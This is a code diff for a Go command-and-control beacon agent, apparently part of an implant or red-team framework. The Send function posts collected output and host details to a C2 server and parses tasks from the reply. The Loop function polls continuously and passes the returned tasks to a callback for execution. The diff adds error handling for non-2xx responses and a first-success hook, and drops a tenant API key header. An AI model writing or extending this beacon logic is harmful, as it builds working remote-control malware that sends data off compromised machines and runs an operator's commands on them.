@@ -100,35 +100,38 @@ func (b *Beacon) Send(output, errStr string, extra map[string]interface{}) (*Res
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("X-Agent-ID", b.agentID)
 	
-	// Send tenant API key if available
-	if b.tenantAPIKey != "" {
-		req.Header.Set("X-Tenant-API-Key", b.tenantAPIKey)
-	}
+
 	
 	resp, err := b.client.Do(req)
 	if err != nil {
 		return nil, fmt.Errorf("beacon POST failed: %v", err)
 	}
 	defer resp.Body.Close()
-	
+
 	log.Printf("Beacon POST -> %s | Agent-ID: %s | seq=%d", resp.Status, b.agentID, b.seq)
-	
+
+	// Treat non-2xx as an error so the agent does not consider this a "successful" beacon
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return nil, fmt.Errorf("beacon returned non-2xx status: %s", resp.Status)
+	}
+
 	// Parse response for tasks
 	var taskResp Response
 	if err := json.NewDecoder(resp.Body).Decode(&taskResp); err != nil {
 		// Not fatal - C2 might not always return tasks
 		return &Response{}, nil
 	}
-	
+
 	if len(taskResp.Tasks) > 0 {
 		log.Printf("Received %d tasks from C2", len(taskResp.Tasks))
 	}
-	
+
 	return &taskResp, nil
 }
 
 // Loop runs the beacon loop continuously
-func (b *Beacon) Loop(getOutput func() (string, string), getExtra func() map[string]interface{}, onTasks func([]TaskInfo)) {
+func (b *Beacon) Loop(getOutput func() (string, string), getExtra func() map[string]interface{}, onTasks func([]TaskInfo), onFirstSuccess func()) {
+	firstSuccessFired := false
 	for {
 		// Get current output and extra info
 		output, errStr := getOutput()
@@ -138,10 +141,19 @@ func (b *Beacon) Loop(getOutput func() (string, string), getExtra func() map[str
 		resp, err := b.Send(output, errStr, extra)
 		if err != nil {
 			log.Printf("Beacon error: %v", err)
-		} else if resp != nil && len(resp.Tasks) > 0 {
-			// Execute tasks
-			if onTasks != nil {
-				onTasks(resp.Tasks)
+		} else {
+			// Fire one-time first-success callback
+			if !firstSuccessFired {
+				firstSuccessFired = true
+				if onFirstSuccess != nil {
+					onFirstSuccess()
+				}
+			}
+			// Execute tasks if any
+			if resp != nil && len(resp.Tasks) > 0 {
+				if onTasks != nil {
+					onTasks(resp.Tasks)
+				}
 			}
 		}
 		
